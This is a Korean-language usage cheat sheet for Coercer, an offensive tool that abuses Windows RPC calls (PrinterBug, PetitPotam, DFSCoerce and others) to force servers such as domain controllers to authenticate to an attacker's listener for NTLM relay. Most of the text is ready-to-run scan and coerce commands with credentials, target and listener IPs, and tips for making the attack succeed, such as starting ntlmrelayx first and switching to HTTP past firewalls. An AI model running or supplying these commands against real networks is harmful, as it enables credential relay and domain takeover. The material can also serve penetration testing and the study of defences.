# Coercer

- Coercer — Windows 호스트에 MS-RPRN·MS-EFSR 등 다양한 RPC 프로토콜 호출을 던져 타깃이 공격자 서버로 SMB/HTTP 인증을 보내게 만드는 파이썬 도구. 총 12개 방법을 자동으로 시도한다.
- DC·파일서버에서 릴레이 트리거가 되는 방법을 찾을 때(scan), 찾은 방법으로 ntlmrelayx·Responder가 돌고 있는 리스너로 인증을 유도할 때(coerce), 새 RPC 경로를 연구할 때(fuzz).
- 타깃 도메인의 인증 계정 1개, 인증을 받아줄 공격자 리스너 IP, 설치는 `pip install coercer`.

## 설치

```bash
sudo python3 -m pip install coercer
```

## 세 가지 모드

- scan: 알려진 방법을 순서대로 호출하고 인증이 들어오는지 확인. 결과를 json/xlsx/sqlite로 저장 가능.
- coerce: 인증을 실제로 리스너로 유도. 공격 본체 실행.
- fuzz: 모든 방법에 다양한 경로를 테스트. 연구용.

## scan — 트리거 가능한 방법 찾기

```bash
coercer scan -u user -p 'Password1' -d corp.local -t 10.10.10.1 -I 10.10.10.100
```

- `-t/--target-ip`: 대상 IP·호스트명. `-I`: 인증을 기다릴 공격자 IP(-i는 인터페이스 지정).

## coerce — 인증 강제

```bash
coercer coerce -u user -p 'Password1' -d corp.local -t 10.10.10.1 -l 10.10.10.100
```

- `-l/--listener-ip`: 인증이 도착할 리스너 IP. coerce 모드에서 필수. 실행 전에 ntlmrelayx·Responder·smbserver를 먼저 띄운다.

## 필터 — 느린 시도 줄이기

```bash
coercer coerce -u user -p 'Password1' -d corp.local -t 10.10.10.1 -l 10.10.10.100 --filter-protocol-name MS-EFSR --filter-method-name EfsRpcOpenFileRaw
```

- `--filter-protocol-name`·`--filter-method-name`·`--filter-pipe-name`: 세 모드 모두에서 범위를 좁힌다.

## 주요 옵션

- `-f/--targets-file`: 대상 목록 파일(-t와 상호배타).
- `-u -p -d`: 계정. `--hashes 'LMHASH:NTHASH'`·`--no-pass`·`--dc-ip`도 지원.
- `--auth-type smb|http`: 리스너 종류에 맞춰 인증 방식 지정.
- `--http-port`(기본 80)·`--smb-port`(기본 445)·`--dce-port`(기본 135).
- `--delay`: 시도 간 지연(초). `-v`: verbose. `--debug`: 디버그.
- `--export-json/--export-xlsx/--export-sqlite`: scan·fuzz 결과 저장.

## 다루는 프로토콜

- MS-RPRN(PrinterBug), MS-EFSR(PetitPotam), MS-FSRVP(ShadowCoerce), MS-DFSNM(DFSCoerce), MS-EVEN(CheeseOunce) 등 총 12개 방법.

## 팁·트러블슈팅

- coerce 실행 전 리스너가 없으면 인증이 어디로 갈지 정해지지 않는다. 항상 리스너 먼저.
- 인증이 안 오면 타깃의 SMB(445) 인바운드 방화벽을 확인하고 `--auth-type http`로 재시도.
- scan이 비어 보여도 방법이 통하는 경우가 있다. DC는 EfsRpcOpenFileRaw(lsarpc 파이프)부터 먼저 시험.
- 특정 방법만 빠르게 확인하려면 --filter-method-name으로 좁히면 시간이 크게 줄어든다.
